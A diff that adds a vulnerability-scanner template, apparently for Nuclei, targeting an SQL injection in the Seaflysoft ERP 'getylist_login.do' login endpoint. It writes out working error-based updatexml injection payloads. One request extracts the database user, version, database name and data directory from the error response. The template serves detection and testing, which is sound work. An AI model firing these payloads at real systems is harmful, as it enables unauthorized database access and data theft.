@@ -1,0 +1,59 @@
+id: seaflysoft-erp-sqli
+
+info:
+  name: Seaflysoft ERP getylist_login.do SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Seaflysoft cloud platform is vulnerable to a SQL injection in the `getylist_login.do` endpoint, allowing attackers to gain unauthorized database access.
+  reference:
+    - http://www.seaflysoft.com/
+  classification:
+    cvss-score: 8.0
+    cvss-metrics: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+
+http:
+  - raw:
+      - |
+        POST /getylist_login.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        accountname=test' and (updatexml(1,concat(0x7e,(select md5(1)),0x7e),1));--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "c4ca4238a0b923820dcc509a6f75849"
+
+  - raw:
+      - |
+        POST /getylist_login.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        accountname=test' and (updatexml(1,concat(0x7e,(select {{sql}}),0x7e),1));--
+    payloads:
+      sql:
+        - "user()"
+        - "version()"
+        - "database()"
+        - "@@datadir"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: regex
+        regex:
+          - "XPATH syntax error"
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "XPATH syntax error: ~(?s)(.*)"
+        group: 1
